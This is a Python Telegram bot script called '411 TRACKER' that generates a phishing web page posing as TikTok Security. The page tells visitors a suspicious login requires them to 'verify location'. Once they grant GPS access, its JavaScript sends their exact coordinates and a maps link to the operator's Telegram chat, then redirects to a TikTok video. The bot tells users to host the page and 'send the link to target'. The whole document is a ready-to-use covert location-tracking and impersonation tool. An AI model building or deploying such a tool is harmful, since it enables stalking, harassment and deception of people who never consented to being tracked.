#!/usr/bin/env python3
import sys, time, os, random, json, base64, requests
from telethon import TelegramClient, events, Button

B = """
\033[1;31m╔══════════════════════════════════════════╗
║     ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗ ║
║     ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║ ║
║     ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║ ║
║     ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║ ║
║     ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║ ║
║     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ║
║                    411 TRACKER v1.0                                   ║
╚══════════════════════════════════════════╝\033[0m
"""

HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>TikTok Security</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#fff}.top-bar{background:#1a1a1a;width:100%;padding:12px 16px;display:flex;align-items:center;border-bottom:1px solid #2a2a2a}.top-bar .logo{font-size:22px;font-weight:700;color:#fff;margin-right:auto}.top-bar .logo span{color:#fe2c55}.main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:30px 20px;width:100%;max-width:400px}.icon-circle{width:90px;height:90px;background:linear-gradient(135deg,#fe2c55,#ff6b35);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:24px;font-size:40px;box-shadow:0 0 40px rgba(254,44,85,0.3)}.main h1{font-size:18px;font-weight:600;margin-bottom:6px;text-align:center}.main p{font-size:13px;color:#888;text-align:center;margin-bottom:30px;line-height:1.5}.verify-btn{background:linear-gradient(135deg,#fe2c55,#ff6b35);color:#fff;border:none;padding:14px 0;font-size:16px;font-weight:600;border-radius:50px;cursor:pointer;width:100%;max-width:320px;transition:all 0.2s;margin-bottom:16px}.verify-btn:active{transform:scale(0.97)}.verify-btn:disabled{opacity:0.5;cursor:not-allowed}.loader{display:none;width:36px;height:36px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #fe2c55;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.status{font-size:12px;color:#666;margin-bottom:20px;text-align:center;min-height:18px}.steps{width:100%;max-width:320px;margin-top:5px}.step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}.step-num{width:22px;height:22px;background:#fe2c55;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0;margin-top:1px}.step-text{font-size:12px;color:#888;line-height:1.5}.step-text span{color:#ccc}.bottom-bar{width:100%;padding:14px 20px;text-align:center;border-top:1px solid #1a1a1a;font-size:11px;color:#444}</style></head><body><div class="top-bar"><div class="logo">tiktok<span>.</span></div><div class="icons" style="color:#888;font-size:20px">&#9661;</div></div><div class="main"><div class="icon-circle"><svg viewBox="0 0 24 24" fill="#fff" width="44" height="44"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div><h1>Verify your location</h1><p>We detected a login from a new device.<br>Verify your location to secure your account.</p><div id="loader" class="loader"></div><p id="status" class="status">Grant location access to continue</p><button class="verify-btn" id="verifyBtn" onclick="getLocation()">VERIFY LOCATION</button><div class="steps"><div class="step"><div class="step-num">1</div><div class="step-text">Tap <span>"Verify Location"</span> above</div></div><div class="step"><div class="step-num">2</div><div class="step-text">Select <span>"While Using the App"</span></div></div><div class="step"><div class="step-num">3</div><div class="step-text">Wait for verification</div></div></div></div><div class="bottom-bar">TikTok Security &bull; v27.5.1</div><script>
var BOT_TOKEN = 'BOT_TOKEN_HERE';
var CHAT_ID = 'CHAT_ID_HERE';
function getLocation(){var btn=document.getElementById('verifyBtn');var loader=document.getElementById('loader');var status=document.getElementById('status');btn.disabled=true;btn.innerHTML='VERIFYING...';loader.style.display='block';status.innerHTML='Requesting GPS...';if(!navigator.geolocation){status.innerHTML='Not available';reset();return;}
navigator.geolocation.getCurrentPosition(function(p){var lat=p.coords.latitude;var lon=p.coords.longitude;var acc=Math.round(p.coords.accuracy);var maps='https://www.google.com/maps?q='+lat+','+lon;var msg='GPS CAPTURED!%0ALat: '+lat+'%0ALon: '+lon+'%0AAccuracy: '+acc+'m%0AMaps: '+maps;var x=new XMLHttpRequest();x.open('GET','https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage?chat_id='+CHAT_ID+'&text='+encodeURIComponent(msg),true);x.send();status.innerHTML='&#10003; Verified! Accuracy: '+acc+'m';loader.style.display='none';btn.innerHTML='&#10003; VERIFIED';setTimeout(function(){window.location.href='https://vt.tiktok.com/ZSxrY2XXM/';},1500);},function(e){var m='Denied';if(e.code==1)m='Location denied. Enable GPS.';else if(e.code==2)m='GPS unavailable.';else m='Timed out.';status.innerHTML='&#10007; '+m;reset();},{enableHighAccuracy:true,timeout:12000,maximumAge:0});}
function reset(){document.getElementById('verifyBtn').disabled=false;document.getElementById('verifyBtn').innerHTML='VERIFY LOCATION';document.getElementById('loader').style.display='none';}
</script></body></html>"""

def anis():
    os.system("clear" if os.name == "posix" else "cls")
    print(B); time.sleep(0.2)
    for _ in range(4):
        print(f"\033[1;32m[+]\033[0m [{random.choice(['INIT','LOAD','AUTH','GEN'])}] {random.choice(['core.sys','gps.mod','payload.bin','tracker.io'])} \033[1;32m{random.choice(['OK','READY','LOADED'])}\033[0m")
        time.sleep(0.05)
    for c in "█▓▒░█▓▒░█▓▒░": print(f"\033[1;31m{c}\033[0m", end="", flush=True); time.sleep(0.01)
    print("\n")

def creds():
    print("\033[1;36m╔══════════════════════════════════════╗\033[0m")
    print("\033[1;36m║       TELEGRAM CREDENTIALS           ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════╝\033[0m\n")
    a = input("\033[1;32m[→] API ID:\033[0m ").strip()
    b = input("\033[1;32m[→] API HASH:\033[0m ").strip()
    c = input("\033[1;32m[→] BOT TOKEN:\033[0m ").strip()
    print("\033[1;33m[+] CONNECTING...\033[0m"); time.sleep(0.3)
    print("\033[1;32m[+] READY\n\033[0m")
    return int(a), b, c

def main():
    anis()
    aid, ah, tok = creds()
    
    bot = TelegramClient("p411", aid, ah).start(bot_token=tok)
    
    @bot.on(events.NewMessage(pattern="/start"))
    async def s(e):
        uid = e.sender_id
        txt = f"`{B}`\n\n**411 TRACKER**\n\n/generate - Create GPS payload\n/chatid - Show your chat ID"
        await e.reply(txt, parse_mode="md")
    
    @bot.on(events.NewMessage(pattern="/chatid"))
    async def cid(e):
        await e.reply(f"**Your Chat ID:** `{e.sender_id}`\n\nUse this when generating.", parse_mode="md")
    
    @bot.on(events.NewMessage(pattern="/generate"))
    async def gen(e):
        uid = e.sender_id
        
        # Inject BOT_TOKEN and CHAT_ID into HTML
        html = HTML.replace("BOT_TOKEN_HERE", tok).replace("CHAT_ID_HERE", str(uid))
        
        # Send the HTML file directly
        fname = "411_tracker.html"
        with open(fname, "w") as f:
            f.write(html)
        
        await e.reply(
            "**✅ PAYLOAD GENERATED**\n\n"
            "Host this HTML on any free hosting (Netlify, GitHub Pages, Vercel)\n"
            "Send the link to target. When they click Verify and accept GPS:\n"
            "→ Coordinates come directly to THIS chat\n"
            "→ Redirects to TikTok video after",
            parse_mode="md"
        )
        
        await bot.send_file(uid, fname)
    
    print("\033[1;32m[+] 411 TRACKER ACTIVE\033[0m")
    print("\033[1;33m[!] /generate to create payload\033[0m")
    bot.run_until_disconnected()

if __name__ == "__main__":
    main()
